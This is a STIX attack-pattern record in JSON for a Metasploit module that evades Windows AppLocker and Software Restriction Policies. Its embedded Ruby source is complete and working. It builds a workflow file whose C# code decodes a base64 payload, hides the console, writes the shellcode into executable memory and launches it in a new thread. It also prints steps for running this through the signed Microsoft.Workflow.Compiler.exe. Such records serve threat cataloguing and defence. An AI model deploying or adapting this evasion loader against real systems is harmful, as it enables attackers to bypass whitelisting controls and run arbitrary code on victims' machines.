{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--48e24f33-b2b2-49c1-8d5b-5c734c9e9035",
    "created": "2024-08-14T16:33:19.194886Z",
    "modified": "2024-08-14T16:33:19.194889Z",
    "name": "Applocker Evasion - Microsoft Workflow Compiler",
    "description": "( This module will assist you in evading Microsoft Windows Applocker and Software Restriction Policies. This technique utilises the Microsoft signed binaries Microsoft.Workflow.Compiler.exe to execute user supplied code. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/evasion/windows/applocker_evasion_workflow_compiler.rb",
            "external_id": "applocker_evasion_workflow_compiler.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Evasion\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Applocker Evasion - Microsoft Workflow Compiler',\n      'Description' => %(\n         This module will assist you in evading Microsoft\n         Windows Applocker and Software Restriction Policies.\n         This technique utilises the Microsoft signed binaries\n         Microsoft.Workflow.Compiler.exe to execute user supplied code.\n                        ),\n      'Author'      =>\n        [\n          'Nick Tyrer <@NickTyrer>', # module development\n          'Matt Graeber' # workflow_compiler bypass research\n        ],\n      'License'     => 'MSF_LICENSE',\n      'Platform'    => 'win',\n      'Arch'        => [ARCH_X86, ARCH_X64],\n      'Targets'     => [['Microsoft Windows', {}]],\n      'References'  => [['URL', 'https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb']])\n    )\n\n    register_options(\n      [\n        OptString.new('XOML_FILE', [true, 'Filename for the .xoml file (default: workflow.xoml)', 'workflow.xoml']),\n        OptString.new('XML_FILE', [true, 'Filename for the .xml file (default: workflow.xml)', 'workflow.xml'])\n      ]\n    )\n\n    deregister_options('FILENAME')\n  end\n\n  def build_payload\n    Rex::Text.encode_base64(payload.encoded)\n  end\n\n  def obfu\n    Rex::Text.rand_text_alpha 8\n  end\n\n  def workflow_xoml\n    esc = build_payload\n    mod = [obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu]\n    <<~HEREDOC\n      <SequentialWorkflowActivity x:Class=\"#{mod[0]}\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/workflow\">\n      <x:Code><![CDATA[\n      public class #{mod[1]} : SequentialWorkflowActivity\n      {\n      public #{mod[1]}()\n      {\n      #{mod[2]}();\n      }\n      public static void #{mod[2]}()\n      {\n      IntPtr #{mod[3]};\n      #{mod[3]} = GetConsoleWindow();\n      ShowWindow(#{mod[3]}, #{mod[4]});\n      string #{mod[5]} = \"#{esc}\";\n      byte[] #{mod[6]} = Convert.FromBase64String(#{mod[5]});\n      byte[] #{mod[7]} = #{mod[6]};\n      IntPtr #{mod[8]} = VirtualAlloc(IntPtr.Zero, (UIntPtr)#{mod[7]}.Length, #{mod[12]}, #{mod[9]});\n      System.Runtime.InteropServices.Marshal.Copy(#{mod[7]}, 0, #{mod[8]}, #{mod[7]}.Length);\n      IntPtr #{mod[10]} = IntPtr.Zero;\n      WaitForSingleObject(CreateThread(#{mod[10]}, UIntPtr.Zero, #{mod[8]}, #{mod[10]}, 0, ref #{mod[10]}), #{mod[11]});\n      }\n      private static Int32 #{mod[12]}=0x1000;\n      private static IntPtr #{mod[9]}=(IntPtr)0x40;\n      private static UInt32 #{mod[11]} = 0xFFFFFFFF;\n      [System.Runtime.InteropServices.DllImport(\"kernel32\")]\n      private static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, Int32 t, IntPtr p);\n      [System.Runtime.InteropServices.DllImport(\"kernel32\")]\n      private static extern IntPtr CreateThread(IntPtr att, UIntPtr st, IntPtr sa, IntPtr p, Int32 c, ref IntPtr #{mod[10]});\n      [System.Runtime.InteropServices.DllImport(\"kernel32\")]\n      private static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);\n      [System.Runtime.InteropServices.DllImport(\"user32.dll\")]\n      static extern bool ShowWindow(IntPtr #{mod[3]}, int nCmdShow);\n      [System.Runtime.InteropServices.DllImport(\"Kernel32\")]\n      private static extern IntPtr GetConsoleWindow();\n      const int #{mod[4]} = 0;\n      }\n      ]]></x:Code>\n      </SequentialWorkflowActivity>\n    HEREDOC\n  end\n\n  def workflow_xml\n    <<~HEREDOC\n      <?xml version=\"1.0\" encoding=\"utf-8\"?>\n      <CompilerInput xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns=\"http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler\">\n      <files xmlns:d2p1=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\">\n      <d2p1:string>#{datastore['XOML_FILE']}</d2p1:string>\n      </files>\n      <parameters xmlns:d2p1=\"http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler\">\n      <assemblyNames xmlns:d3p1=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" />\n      <compilerOptions i:nil=\"true\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" />\n      <coreAssemblyFileName xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\"></coreAssemblyFileName>\n      <embeddedResources xmlns:d3p1=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" />\n      <evidence xmlns:d3p1=\"http://schemas.datacontract.org/2004/07/System.Security.Policy\" i:nil=\"true\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" />\n      <generateExecutable xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\">false</generateExecutable>\n      <generateInMemory xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\">true</generateInMemory>\n      <includeDebugInformation xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\">false</includeDebugInformation>\n      <linkedResources xmlns:d3p1=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" />\n      <mainClass i:nil=\"true\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" />\n      <outputName xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\"></outputName>\n      <tempFiles i:nil=\"true\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" />\n      <treatWarningsAsErrors xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\">false</treatWarningsAsErrors>\n      <warningLevel xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\">-1</warningLevel>\n      <win32Resource i:nil=\"true\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" />\n      <d2p1:checkTypes>false</d2p1:checkTypes>\n      <d2p1:compileWithNoCode>false</d2p1:compileWithNoCode>\n      <d2p1:compilerOptions i:nil=\"true\" />\n      <d2p1:generateCCU>false</d2p1:generateCCU>\n      <d2p1:languageToUse>CSharp</d2p1:languageToUse>\n      <d2p1:libraryPaths xmlns:d3p1=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\" i:nil=\"true\" />\n      <d2p1:localAssembly xmlns:d3p1=\"http://schemas.datacontract.org/2004/07/System.Reflection\" i:nil=\"true\" />\n      <d2p1:mtInfo i:nil=\"true\" />\n      <d2p1:userCodeCCUs xmlns:d3p1=\"http://schemas.datacontract.org/2004/07/System.CodeDom\" i:nil=\"true\" />\n      </parameters>\n      </CompilerInput>\n    HEREDOC\n  end\n\n  def file_format_filename(name = '')\n    name.empty? ? @fname : @fname = name\n  end\n\n  def create_files\n    f1 = datastore['XOML_FILE'].empty? ? 'workflow.xoml' : datastore['XOML_FILE']\n    f1 << '.xoml' unless f1.downcase.end_with?('.xoml')\n    f2 = datastore['XML_FILE'].empty? ? 'workflow.xml' : datastore['XML_FILE']\n    f2 << '.xml' unless f2.downcase.end_with?('.xml')\n    xoml_file = workflow_xoml\n    xml_file = workflow_xml\n    file_format_filename(f1)\n    file_create(xoml_file)\n    file_format_filename(f2)\n    file_create(xml_file)\n  end\n\n  def instructions\n    print_status \"Copy #{datastore['XOML_FILE']} and #{datastore['XML_FILE']} to the target\"\n    if payload.arch.first == ARCH_X86\n      print_status \"Execute using: C:\\\\Windows\\\\Microsoft.Net\\\\Framework\\\\[.NET Version]\\\\Microsoft.Workflow.Compiler.exe #{datastore['XML_FILE']} #{Rex::Text.rand_text_alpha 3}\"\n    else\n      print_status \"Execute using: C:\\\\Windows\\\\Microsoft.Net\\\\Framework64\\\\[.NET Version]\\\\Microsoft.Workflow.Compiler.exe #{datastore['XML_FILE']} #{Rex::Text.rand_text_alpha 3}\"\n    end\n  end\n\n  def run\n    create_files\n    instructions\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}